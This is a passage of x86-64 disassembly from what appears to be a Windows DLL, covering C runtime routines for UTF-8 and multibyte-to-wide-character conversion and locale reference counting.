   180009829:	4c 8b c3             	mov    %rbx,%r8
   18000982c:	33 d2                	xor    %edx,%edx
   18000982e:	ff 15 0c 59 00 00    	call   *0x590c(%rip)        # 0x18000f140
   180009834:	48 85 c0             	test   %rax,%rax
   180009837:	74 d4                	je     0x18000980d
   180009839:	eb 0d                	jmp    0x180009848
   18000983b:	e8 b4 c8 ff ff       	call   0x1800060f4
   180009840:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   180009846:	33 c0                	xor    %eax,%eax
   180009848:	48 83 c4 20          	add    $0x20,%rsp
   18000984c:	5b                   	pop    %rbx
   18000984d:	c3                   	ret
   18000984e:	cc                   	int3
   18000984f:	cc                   	int3
   180009850:	48 8b c4             	mov    %rsp,%rax
   180009853:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180009857:	48 89 68 10          	mov    %rbp,0x10(%rax)
   18000985b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000985f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180009863:	41 56                	push   %r14
   180009865:	48 83 ec 30          	sub    $0x30,%rsp
   180009869:	45 33 f6             	xor    %r14d,%r14d
   18000986c:	49 8b d9             	mov    %r9,%rbx
   18000986f:	49 8b e8             	mov    %r8,%rbp
   180009872:	48 8b f2             	mov    %rdx,%rsi
   180009875:	48 8b f9             	mov    %rcx,%rdi
   180009878:	48 85 d2             	test   %rdx,%rdx
   18000987b:	0f 84 23 01 00 00    	je     0x1800099a4
   180009881:	4d 85 c0             	test   %r8,%r8
   180009884:	0f 84 1a 01 00 00    	je     0x1800099a4
   18000988a:	44 38 32             	cmp    %r14b,(%rdx)
   18000988d:	75 12                	jne    0x1800098a1
   18000988f:	48 85 c9             	test   %rcx,%rcx
   180009892:	0f 84 13 01 00 00    	je     0x1800099ab
   180009898:	66 44 89 31          	mov    %r14w,(%rcx)
   18000989c:	e9 0a 01 00 00       	jmp    0x1800099ab
   1800098a1:	45 38 71 28          	cmp    %r14b,0x28(%r9)
   1800098a5:	75 08                	jne    0x1800098af
   1800098a7:	48 8b cb             	mov    %rbx,%rcx
   1800098aa:	e8 91 c2 ff ff       	call   0x180005b40
   1800098af:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   1800098b3:	44 8b 52 0c          	mov    0xc(%rdx),%r10d
   1800098b7:	41 81 fa e9 fd 00 00 	cmp    $0xfde9,%r10d
   1800098be:	75 27                	jne    0x1800098e7
   1800098c0:	4c 8d 0d 61 1c 01 00 	lea    0x11c61(%rip),%r9        # 0x18001b528
   1800098c7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1800098cc:	4c 8b c5             	mov    %rbp,%r8
   1800098cf:	48 8b d6             	mov    %rsi,%rdx
   1800098d2:	48 8b cf             	mov    %rdi,%rcx
   1800098d5:	e8 e6 02 00 00       	call   0x180009bc0
   1800098da:	83 c9 ff             	or     $0xffffffff,%ecx
   1800098dd:	85 c0                	test   %eax,%eax
   1800098df:	0f 48 c1             	cmovs  %ecx,%eax
   1800098e2:	e9 c6 00 00 00       	jmp    0x1800099ad
   1800098e7:	4c 39 b2 38 01 00 00 	cmp    %r14,0x138(%rdx)
   1800098ee:	75 14                	jne    0x180009904
   1800098f0:	48 85 ff             	test   %rdi,%rdi
   1800098f3:	0f 84 a4 00 00 00    	je     0x18000999d
   1800098f9:	0f b6 06             	movzbl (%rsi),%eax
   1800098fc:	66 89 07             	mov    %ax,(%rdi)
   1800098ff:	e9 99 00 00 00       	jmp    0x18000999d
   180009904:	0f b6 0e             	movzbl (%rsi),%ecx
   180009907:	48 8b 02             	mov    (%rdx),%rax
   18000990a:	66 44 39 34 48       	cmp    %r14w,(%rax,%rcx,2)
   18000990f:	7d 61                	jge    0x180009972
   180009911:	44 8b 4a 08          	mov    0x8(%rdx),%r9d
   180009915:	41 83 f9 01          	cmp    $0x1,%r9d
   180009919:	7e 2b                	jle    0x180009946
   18000991b:	41 3b e9             	cmp    %r9d,%ebp
   18000991e:	7c 26                	jl     0x180009946
   180009920:	41 8b c6             	mov    %r14d,%eax
   180009923:	48 85 ff             	test   %rdi,%rdi
   180009926:	4c 8b c6             	mov    %rsi,%r8
   180009929:	ba 09 00 00 00       	mov    $0x9,%edx
   18000992e:	0f 95 c0             	setne  %al
   180009931:	41 8b ca             	mov    %r10d,%ecx
   180009934:	89 44 24 28          	mov    %eax,0x28(%rsp)
   180009938:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   18000993d:	e8 4a ea ff ff       	call   0x18000838c
   180009942:	85 c0                	test   %eax,%eax
   180009944:	75 13                	jne    0x180009959
   180009946:	48 8b 43 18          	mov    0x18(%rbx),%rax
   18000994a:	48 63 48 08          	movslq 0x8(%rax),%rcx
   18000994e:	48 3b e9             	cmp    %rcx,%rbp
   180009951:	72 0f                	jb     0x180009962
   180009953:	44 38 76 01          	cmp    %r14b,0x1(%rsi)
   180009957:	74 09                	je     0x180009962
   180009959:	48 8b 43 18          	mov    0x18(%rbx),%rax
   18000995d:	8b 40 08             	mov    0x8(%rax),%eax
   180009960:	eb 4b                	jmp    0x1800099ad
   180009962:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   180009966:	83 c8 ff             	or     $0xffffffff,%eax
   180009969:	c7 43 2c 2a 00 00 00 	movl   $0x2a,0x2c(%rbx)
   180009970:	eb 3b                	jmp    0x1800099ad
   180009972:	41 8b c6             	mov    %r14d,%eax
   180009975:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   18000997b:	48 85 ff             	test   %rdi,%rdi
   18000997e:	4c 8b c6             	mov    %rsi,%r8
   180009981:	41 8b ca             	mov    %r10d,%ecx
   180009984:	0f 95 c0             	setne  %al
   180009987:	89 44 24 28          	mov    %eax,0x28(%rsp)
   18000998b:	41 8d 51 08          	lea    0x8(%r9),%edx
   18000998f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180009994:	e8 f3 e9 ff ff       	call   0x18000838c
   180009999:	85 c0                	test   %eax,%eax
   18000999b:	74 c5                	je     0x180009962
   18000999d:	b8 01 00 00 00       	mov    $0x1,%eax
   1800099a2:	eb 09                	jmp    0x1800099ad
   1800099a4:	4c 89 35 7d 1b 01 00 	mov    %r14,0x11b7d(%rip)        # 0x18001b528
   1800099ab:	33 c0                	xor    %eax,%eax
   1800099ad:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1800099b2:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   1800099b7:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   1800099bc:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   1800099c1:	48 83 c4 30          	add    $0x30,%rsp
   1800099c5:	41 5e                	pop    %r14
   1800099c7:	c3                   	ret
   1800099c8:	8a 11                	mov    (%rcx),%dl
   1800099ca:	33 c0                	xor    %eax,%eax
   1800099cc:	84 d2                	test   %dl,%dl
   1800099ce:	78 04                	js     0x1800099d4
   1800099d0:	0f 95 c0             	setne  %al
   1800099d3:	c3                   	ret
   1800099d4:	8a c2                	mov    %dl,%al
   1800099d6:	24 e0                	and    $0xe0,%al
   1800099d8:	3c c0                	cmp    $0xc0,%al
   1800099da:	75 06                	jne    0x1800099e2
   1800099dc:	b8 02 00 00 00       	mov    $0x2,%eax
   1800099e1:	c3                   	ret
   1800099e2:	8a c2                	mov    %dl,%al
   1800099e4:	24 f0                	and    $0xf0,%al
   1800099e6:	3c e0                	cmp    $0xe0,%al
   1800099e8:	75 06                	jne    0x1800099f0
   1800099ea:	b8 03 00 00 00       	mov    $0x3,%eax
   1800099ef:	c3                   	ret
   1800099f0:	83 c8 ff             	or     $0xffffffff,%eax
   1800099f3:	80 e2 f8             	and    $0xf8,%dl
   1800099f6:	80 fa f0             	cmp    $0xf0,%dl
   1800099f9:	8d 48 05             	lea    0x5(%rax),%ecx
   1800099fc:	0f 44 c1             	cmove  %ecx,%eax
   1800099ff:	c3                   	ret
   180009a00:	40 53                	rex push %rbx
   180009a02:	55                   	push   %rbp
   180009a03:	56                   	push   %rsi
   180009a04:	57                   	push   %rdi
   180009a05:	41 54                	push   %r12
   180009a07:	41 56                	push   %r14
   180009a09:	41 57                	push   %r15
   180009a0b:	48 83 ec 40          	sub    $0x40,%rsp
   180009a0f:	48 8b 05 ea 05 01 00 	mov    0x105ea(%rip),%rax        # 0x18001a000
   180009a16:	48 33 c4             	xor    %rsp,%rax
   180009a19:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180009a1e:	48 8b b4 24 a0 00 00 	mov    0xa0(%rsp),%rsi
   180009a25:	00 
   180009a26:	48 8d 1d 03 1b 01 00 	lea    0x11b03(%rip),%rbx        # 0x18001b530
   180009a2d:	45 33 e4             	xor    %r12d,%r12d
   180009a30:	48 8d 3d fb 60 00 00 	lea    0x60fb(%rip),%rdi        # 0x18000fb32
   180009a37:	4d 85 c9             	test   %r9,%r9
   180009a3a:	48 8b c2             	mov    %rdx,%rax
   180009a3d:	4c 8b fa             	mov    %rdx,%r15
   180009a40:	49 0f 45 d9          	cmovne %r9,%rbx
   180009a44:	48 85 d2             	test   %rdx,%rdx
   180009a47:	41 8d 6c 24 01       	lea    0x1(%r12),%ebp
   180009a4c:	49 0f 45 e8          	cmovne %r8,%rbp
   180009a50:	48 0f 45 fa          	cmovne %rdx,%rdi
   180009a54:	48 f7 d8             	neg    %rax
   180009a57:	4d 1b f6             	sbb    %r14,%r14
   180009a5a:	4c 23 f1             	and    %rcx,%r14
   180009a5d:	48 85 ed             	test   %rbp,%rbp
   180009a60:	75 0c                	jne    0x180009a6e
   180009a62:	48 c7 c0 fe ff ff ff 	mov    $0xfffffffffffffffe,%rax
   180009a69:	e9 33 01 00 00       	jmp    0x180009ba1
   180009a6e:	66 44 39 63 06       	cmp    %r12w,0x6(%rbx)
   180009a73:	75 4f                	jne    0x180009ac4
   180009a75:	48 8b cf             	mov    %rdi,%rcx
   180009a78:	e8 4b ff ff ff       	call   0x1800099c8
   180009a7d:	4c 63 c0             	movslq %eax,%r8
   180009a80:	0f b6 07             	movzbl (%rdi),%eax
   180009a83:	48 ff c7             	inc    %rdi
   180009a86:	41 83 f8 01          	cmp    $0x1,%r8d
   180009a8a:	76 28                	jbe    0x180009ab4
   180009a8c:	41 8d 48 fe          	lea    -0x2(%r8),%ecx
   180009a90:	83 f9 02             	cmp    $0x2,%ecx
   180009a93:	0f 87 fd 00 00 00    	ja     0x180009b96
   180009a99:	41 0f b6 d0          	movzbl %r8b,%edx
   180009a9d:	b9 07 00 00 00       	mov    $0x7,%ecx
   180009aa2:	2b ca                	sub    %edx,%ecx
   180009aa4:	45 8a c8             	mov    %r8b,%r9b
   180009aa7:	ba 01 00 00 00       	mov    $0x1,%edx
   180009aac:	d3 e2                	shl    %cl,%edx
   180009aae:	ff ca                	dec    %edx
   180009ab0:	23 d0                	and    %eax,%edx
   180009ab2:	eb 39                	jmp    0x180009aed
   180009ab4:	4d 85 f6             	test   %r14,%r14
   180009ab7:	74 03                	je     0x180009abc
   180009ab9:	41 89 06             	mov    %eax,(%r14)
   180009abc:	49 8b c0             	mov    %r8,%rax
   180009abf:	e9 dd 00 00 00       	jmp    0x180009ba1
   180009ac4:	44 8a 43 04          	mov    0x4(%rbx),%r8b
   180009ac8:	8b 13                	mov    (%rbx),%edx
   180009aca:	44 8a 4b 06          	mov    0x6(%rbx),%r9b
   180009ace:	41 8d 40 fe          	lea    -0x2(%r8),%eax
   180009ad2:	3c 02                	cmp    $0x2,%al
   180009ad4:	0f 87 bc 00 00 00    	ja     0x180009b96
   180009ada:	41 80 f9 01          	cmp    $0x1,%r9b
   180009ade:	0f 82 b2 00 00 00    	jb     0x180009b96
   180009ae4:	45 3a c8             	cmp    %r8b,%r9b
   180009ae7:	0f 83 a9 00 00 00    	jae    0x180009b96
   180009aed:	45 0f b6 d9          	movzbl %r9b,%r11d
   180009af1:	4c 3b dd             	cmp    %rbp,%r11
   180009af4:	45 8b d3             	mov    %r11d,%r10d
   180009af7:	4c 0f 43 d5          	cmovae %rbp,%r10
   180009afb:	eb 1e                	jmp    0x180009b1b
   180009afd:	0f b6 0f             	movzbl (%rdi),%ecx
   180009b00:	48 ff c7             	inc    %rdi
   180009b03:	8a c1                	mov    %cl,%al
   180009b05:	24 c0                	and    $0xc0,%al
   180009b07:	3c 80                	cmp    $0x80,%al
   180009b09:	0f 85 87 00 00 00    	jne    0x180009b96
   180009b0f:	8b c2                	mov    %edx,%eax
   180009b11:	83 e1 3f             	and    $0x3f,%ecx
   180009b14:	c1 e0 06             	shl    $0x6,%eax
   180009b17:	8b d1                	mov    %ecx,%edx
   180009b19:	0b d0                	or     %eax,%edx
   180009b1b:	48 8b c7             	mov    %rdi,%rax
   180009b1e:	49 2b c7             	sub    %r15,%rax
   180009b21:	49 3b c2             	cmp    %r10,%rax
   180009b24:	72 d7                	jb     0x180009afd
   180009b26:	4d 3b d3             	cmp    %r11,%r10
   180009b29:	73 1a                	jae    0x180009b45
   180009b2b:	41 0f b6 c0          	movzbl %r8b,%eax
   180009b2f:	45 2a ca             	sub    %r10b,%r9b
   180009b32:	66 89 43 04          	mov    %ax,0x4(%rbx)
   180009b36:	41 0f b6 c1          	movzbl %r9b,%eax
   180009b3a:	66 89 43 06          	mov    %ax,0x6(%rbx)
   180009b3e:	89 13                	mov    %edx,(%rbx)
   180009b40:	e9 1d ff ff ff       	jmp    0x180009a62
   180009b45:	8d 82 00 28 ff ff    	lea    -0xd800(%rdx),%eax
   180009b4b:	3d ff 07 00 00       	cmp    $0x7ff,%eax
   180009b50:	76 44                	jbe    0x180009b96
   180009b52:	81 fa 00 00 11 00    	cmp    $0x110000,%edx
   180009b58:	73 3c                	jae    0x180009b96
   180009b5a:	41 0f b6 c0          	movzbl %r8b,%eax
   180009b5e:	c7 44 24 20 80 00 00 	movl   $0x80,0x20(%rsp)
   180009b65:	00 
   180009b66:	c7 44 24 24 00 08 00 	movl   $0x800,0x24(%rsp)
   180009b6d:	00 
   180009b6e:	c7 44 24 28 00 00 01 	movl   $0x10000,0x28(%rsp)
   180009b75:	00 
   180009b76:	3b 54 84 18          	cmp    0x18(%rsp,%rax,4),%edx
   180009b7a:	72 1a                	jb     0x180009b96
   180009b7c:	4d 85 f6             	test   %r14,%r14
   180009b7f:	74 03                	je     0x180009b84
   180009b81:	41 89 16             	mov    %edx,(%r14)
   180009b84:	f7 da                	neg    %edx
   180009b86:	48 8b d3             	mov    %rbx,%rdx
   180009b89:	48 1b c9             	sbb    %rcx,%rcx
   180009b8c:	49 23 cb             	and    %r11,%rcx
   180009b8f:	e8 68 2c 00 00       	call   0x18000c7fc
   180009b94:	eb 0b                	jmp    0x180009ba1
   180009b96:	48 8b d6             	mov    %rsi,%rdx
   180009b99:	48 8b cb             	mov    %rbx,%rcx
   180009b9c:	e8 63 2c 00 00       	call   0x18000c804
   180009ba1:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180009ba6:	48 33 cc             	xor    %rsp,%rcx
   180009ba9:	e8 22 77 ff ff       	call   0x1800012d0
   180009bae:	48 83 c4 40          	add    $0x40,%rsp
   180009bb2:	41 5f                	pop    %r15
   180009bb4:	41 5e                	pop    %r14
   180009bb6:	41 5c                	pop    %r12
   180009bb8:	5f                   	pop    %rdi
   180009bb9:	5e                   	pop    %rsi
   180009bba:	5d                   	pop    %rbp
   180009bbb:	5b                   	pop    %rbx
   180009bbc:	c3                   	ret
   180009bbd:	cc                   	int3
   180009bbe:	cc                   	int3
   180009bbf:	cc                   	int3
   180009bc0:	40 53                	rex push %rbx
   180009bc2:	48 83 ec 40          	sub    $0x40,%rsp
   180009bc6:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180009bcb:	48 8b d9             	mov    %rcx,%rbx
   180009bce:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   180009bd3:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180009bd8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180009bdd:	e8 1e fe ff ff       	call   0x180009a00
   180009be2:	48 83 f8 04          	cmp    $0x4,%rax
   180009be6:	77 19                	ja     0x180009c01
   180009be8:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   180009bec:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
   180009bf2:	76 05                	jbe    0x180009bf9
   180009bf4:	b9 fd ff 00 00       	mov    $0xfffd,%ecx
   180009bf9:	48 85 db             	test   %rbx,%rbx
   180009bfc:	74 03                	je     0x180009c01
   180009bfe:	66 89 0b             	mov    %cx,(%rbx)
   180009c01:	48 83 c4 40          	add    $0x40,%rsp
   180009c05:	5b                   	pop    %rbx
   180009c06:	c3                   	ret
   180009c07:	cc                   	int3
   180009c08:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180009c0d:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   180009c12:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180009c17:	57                   	push   %rdi
   180009c18:	41 54                	push   %r12
   180009c1a:	41 55                	push   %r13
   180009c1c:	41 56                	push   %r14
   180009c1e:	41 57                	push   %r15
   180009c20:	48 83 ec 30          	sub    $0x30,%rsp
   180009c24:	48 8b 3a             	mov    (%rdx),%rdi
   180009c27:	45 33 ed             	xor    %r13d,%r13d
   180009c2a:	4d 8b e1             	mov    %r9,%r12
   180009c2d:	49 8b f0             	mov    %r8,%rsi
   180009c30:	4c 8b f2             	mov    %rdx,%r14
   180009c33:	48 8b e9             	mov    %rcx,%rbp
   180009c36:	48 85 c9             	test   %rcx,%rcx
   180009c39:	0f 84 eb 00 00 00    	je     0x180009d2a
   180009c3f:	48 8b d9             	mov    %rcx,%rbx
   180009c42:	4d 85 c0             	test   %r8,%r8
   180009c45:	0f 84 b3 00 00 00    	je     0x180009cfe
   180009c4b:	4c 8b bc 24 80 00 00 	mov    0x80(%rsp),%r15
   180009c52:	00 
   180009c53:	44 38 2f             	cmp    %r13b,(%rdi)
   180009c56:	75 08                	jne    0x180009c60
   180009c58:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180009c5e:	eb 1d                	jmp    0x180009c7d
   180009c60:	44 38 6f 01          	cmp    %r13b,0x1(%rdi)
   180009c64:	75 08                	jne    0x180009c6e
   180009c66:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   180009c6c:	eb 0f                	jmp    0x180009c7d
   180009c6e:	8a 47 02             	mov    0x2(%rdi),%al
   180009c71:	f6 d8                	neg    %al
   180009c73:	4d 1b c0             	sbb    %r8,%r8
   180009c76:	49 f7 d8             	neg    %r8
   180009c79:	49 83 c0 03          	add    $0x3,%r8
   180009c7d:	4d 8b cc             	mov    %r12,%r9
   180009c80:	44 89 6c 24 60       	mov    %r13d,0x60(%rsp)
   180009c85:	48 8b d7             	mov    %rdi,%rdx
   180009c88:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   180009c8d:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   180009c92:	e8 69 fd ff ff       	call   0x180009a00
   180009c97:	48 8b d0             	mov    %rax,%rdx
   180009c9a:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   180009c9e:	74 78                	je     0x180009d18
   180009ca0:	48 85 c0             	test   %rax,%rax
   180009ca3:	74 6a                	je     0x180009d0f
   180009ca5:	8b 4c 24 60          	mov    0x60(%rsp),%ecx
   180009ca9:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
   180009caf:	76 39                	jbe    0x180009cea
   180009cb1:	48 83 fe 01          	cmp    $0x1,%rsi
   180009cb5:	76 47                	jbe    0x180009cfe
   180009cb7:	81 c1 00 00 ff ff    	add    $0xffff0000,%ecx
   180009cbd:	41 b8 00 d8 00 00    	mov    $0xd800,%r8d
   180009cc3:	8b c1                	mov    %ecx,%eax
   180009cc5:	89 4c 24 60          	mov    %ecx,0x60(%rsp)
   180009cc9:	c1 e8 0a             	shr    $0xa,%eax
   180009ccc:	48 ff ce             	dec    %rsi
   180009ccf:	66 41 0b c0          	or     %r8w,%ax
   180009cd3:	66 89 03             	mov    %ax,(%rbx)
   180009cd6:	b8 ff 03 00 00       	mov    $0x3ff,%eax
   180009cdb:	66 23 c8             	and    %ax,%cx
   180009cde:	48 83 c3 02          	add    $0x2,%rbx
   180009ce2:	b8 00 dc 00 00       	mov    $0xdc00,%eax
   180009ce7:	66 0b c8             	or     %ax,%cx
   180009cea:	66 89 0b             	mov    %cx,(%rbx)
   180009ced:	48 03 fa             	add    %rdx,%rdi
   180009cf0:	48 83 c3 02          	add    $0x2,%rbx
   180009cf4:	48 83 ee 01          	sub    $0x1,%rsi
   180009cf8:	0f 85 55 ff ff ff    	jne    0x180009c53
   180009cfe:	48 2b dd             	sub    %rbp,%rbx
   180009d01:	49 89 3e             	mov    %rdi,(%r14)
   180009d04:	48 d1 fb             	sar    $1,%rbx
   180009d07:	48 8b c3             	mov    %rbx,%rax
   180009d0a:	e9 91 00 00 00       	jmp    0x180009da0
   180009d0f:	49 8b fd             	mov    %r13,%rdi
   180009d12:	66 44 89 2b          	mov    %r13w,(%rbx)
   180009d16:	eb e6                	jmp    0x180009cfe
   180009d18:	49 89 3e             	mov    %rdi,(%r14)
   180009d1b:	41 c6 47 30 01       	movb   $0x1,0x30(%r15)
   180009d20:	41 c7 47 2c 2a 00 00 	movl   $0x2a,0x2c(%r15)
   180009d27:	00 
   180009d28:	eb 72                	jmp    0x180009d9c
   180009d2a:	48 8b b4 24 80 00 00 	mov    0x80(%rsp),%rsi
   180009d31:	00 
   180009d32:	49 8b dd             	mov    %r13,%rbx
   180009d35:	44 38 2f             	cmp    %r13b,(%rdi)
   180009d38:	75 08                	jne    0x180009d42
   180009d3a:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180009d40:	eb 1d                	jmp    0x180009d5f
   180009d42:	44 38 6f 01          	cmp    %r13b,0x1(%rdi)
   180009d46:	75 08                	jne    0x180009d50
   180009d48:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   180009d4e:	eb 0f                	jmp    0x180009d5f
   180009d50:	8a 47 02             	mov    0x2(%rdi),%al
   180009d53:	f6 d8                	neg    %al
   180009d55:	4d 1b c0             	sbb    %r8,%r8
   180009d58:	49 f7 d8             	neg    %r8
   180009d5b:	49 83 c0 03          	add    $0x3,%r8
   180009d5f:	4d 8b cc             	mov    %r12,%r9
   180009d62:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180009d67:	48 8b d7             	mov    %rdi,%rdx
   180009d6a:	33 c9                	xor    %ecx,%ecx
   180009d6c:	e8 8f fc ff ff       	call   0x180009a00
   180009d71:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   180009d75:	74 1a                	je     0x180009d91
   180009d77:	48 85 c0             	test   %rax,%rax
   180009d7a:	74 8b                	je     0x180009d07
   180009d7c:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   180009d80:	48 03 f8             	add    %rax,%rdi
   180009d83:	48 83 f8 04          	cmp    $0x4,%rax
   180009d87:	48 0f 45 cb          	cmovne %rbx,%rcx
   180009d8b:	48 8d 59 01          	lea    0x1(%rcx),%rbx
   180009d8f:	eb a4                	jmp    0x180009d35
   180009d91:	c6 46 30 01          	movb   $0x1,0x30(%rsi)
   180009d95:	c7 46 2c 2a 00 00 00 	movl   $0x2a,0x2c(%rsi)
   180009d9c:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   180009da0:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   180009da5:	48 8b 6c 24 70       	mov    0x70(%rsp),%rbp
   180009daa:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   180009daf:	48 83 c4 30          	add    $0x30,%rsp
   180009db3:	41 5f                	pop    %r15
   180009db5:	41 5e                	pop    %r14
   180009db7:	41 5d                	pop    %r13
   180009db9:	41 5c                	pop    %r12
   180009dbb:	5f                   	pop    %rdi
   180009dbc:	c3                   	ret
   180009dbd:	cc                   	int3
   180009dbe:	cc                   	int3
   180009dbf:	cc                   	int3
   180009dc0:	48 83 ec 28          	sub    $0x28,%rsp
   180009dc4:	48 85 c9             	test   %rcx,%rcx
   180009dc7:	75 15                	jne    0x180009dde
   180009dc9:	e8 26 c3 ff ff       	call   0x1800060f4
   180009dce:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   180009dd4:	e8 73 c1 ff ff       	call   0x180005f4c
   180009dd9:	83 c8 ff             	or     $0xffffffff,%eax
   180009ddc:	eb 04                	jmp    0x180009de2
   180009dde:	8b 41 18             	mov    0x18(%rcx),%eax
   180009de1:	90                   	nop
   180009de2:	48 83 c4 28          	add    $0x28,%rsp
   180009de6:	c3                   	ret
   180009de7:	cc                   	int3
   180009de8:	f0 ff 41 10          	lock incl 0x10(%rcx)
   180009dec:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   180009df3:	48 85 c0             	test   %rax,%rax
   180009df6:	74 03                	je     0x180009dfb
   180009df8:	f0 ff 00             	lock incl (%rax)
   180009dfb:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   180009e02:	48 85 c0             	test   %rax,%rax
   180009e05:	74 03                	je     0x180009e0a
   180009e07:	f0 ff 00             	lock incl (%rax)
   180009e0a:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   180009e11:	48 85 c0             	test   %rax,%rax
   180009e14:	74 03                	je     0x180009e19
   180009e16:	f0 ff 00             	lock incl (%rax)
   180009e19:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   180009e20:	48 85 c0             	test   %rax,%rax
   180009e23:	74 03                	je     0x180009e28
   180009e25:	f0 ff 00             	lock incl (%rax)
   180009e28:	48 8d 41 38          	lea    0x38(%rcx),%rax
   180009e2c:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   180009e32:	48 8d 15 cf 03 01 00 	lea    0x103cf(%rip),%rdx        # 0x18001a208
   180009e39:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   180009e3d:	74 0b                	je     0x180009e4a
   180009e3f:	48 8b 10             	mov    (%rax),%rdx
   180009e42:	48 85 d2             	test   %rdx,%rdx
   180009e45:	74 03                	je     0x180009e4a
   180009e47:	f0 ff 02             	lock incl (%rdx)
   180009e4a:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   180009e4f:	74 0c                	je     0x180009e5d
   180009e51:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   180009e55:	48 85 d2             	test   %rdx,%rdx
   180009e58:	74 03                	je     0x180009e5d
   180009e5a:	f0 ff 02             	lock incl (%rdx)
   180009e5d:	48 83 c0 20          	add    $0x20,%rax
   180009e61:	49 83 e8 01          	sub    $0x1,%r8
   180009e65:	75 cb                	jne    0x180009e32
   180009e67:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   180009e6e:	e9 79 01 00 00       	jmp    0x180009fec
   180009e73:	cc                   	int3
   180009e74:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180009e79:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180009e7e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180009e83:	57                   	push   %rdi
   180009e84:	48 83 ec 20          	sub    $0x20,%rsp
   180009e88:	48 8b 81 f8 00 00 00 	mov    0xf8(%rcx),%rax
   180009e8f:	48 8b d9             	mov    %rcx,%rbx
   180009e92:	48 85 c0             	test   %rax,%rax
   180009e95:	74 79                	je     0x180009f10
   180009e97:	48 8d 0d c2 09 01 00 	lea    0x109c2(%rip),%rcx        # 0x18001a860
   180009e9e:	48 3b c1             	cmp    %rcx,%rax
   180009ea1:	74 6d                	je     0x180009f10
   180009ea3:	48 8b 83 e0 00 00 00 	mov    0xe0(%rbx),%rax
   180009eaa:	48 85 c0             	test   %rax,%rax
   180009ead:	74 61                	je     0x180009f10
   180009eaf:	83 38 00             	cmpl   $0x0,(%rax)
   180009eb2:	75 5c                	jne    0x180009f10
   180009eb4:	48 8b 8b f0 00 00 00 	mov    0xf0(%rbx),%rcx
   180009ebb:	48 85 c9             	test   %rcx,%rcx
   180009ebe:	74 16                	je     0x180009ed6
   180009ec0:	83 39 00             	cmpl   $0x0,(%rcx)
   180009ec3:	75 11                	jne    0x180009ed6
   180009ec5:	e8 a6 cb ff ff       	call   0x180006a70
   180009eca:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   180009ed1:	e8 1e 03 00 00       	call   0x18000a1f4
   180009ed6:	48 8b 8b e8 00 00 00 	mov    0xe8(%rbx),%rcx
   180009edd:	48 85 c9             	test   %rcx,%rcx
   180009ee0:	74 16                	je     0x180009ef8
   180009ee2:	83 39 00             	cmpl   $0x0,(%rcx)
   180009ee5:	75 11                	jne    0x180009ef8
   180009ee7:	e8 84 cb ff ff       	call   0x180006a70
   180009eec:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   180009ef3:	e8 08 04 00 00       	call   0x18000a300
   180009ef8:	48 8b 8b e0 00 00 00 	mov    0xe0(%rbx),%rcx
   180009eff:	e8 6c cb ff ff       	call   0x180006a70
   180009f04:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   180009f0b:	e8 60 cb ff ff       	call   0x180006a70
   180009f10:	48 8b 83 00 01 00 00 	mov    0x100(%rbx),%rax
   180009f17:	48 85 c0             	test   %rax,%rax
   180009f1a:	74 47                	je     0x180009f63
   180009f1c:	83 38 00             	cmpl   $0x0,(%rax)
   180009f1f:	75 42                	jne    0x180009f63
   180009f21:	48 8b 8b 08 01 00 00 	mov    0x108(%rbx),%rcx
   180009f28:	48 81 e9 fe 00 00 00 	sub    $0xfe,%rcx
   180009f2f:	e8 3c cb ff ff       	call   0x180006a70
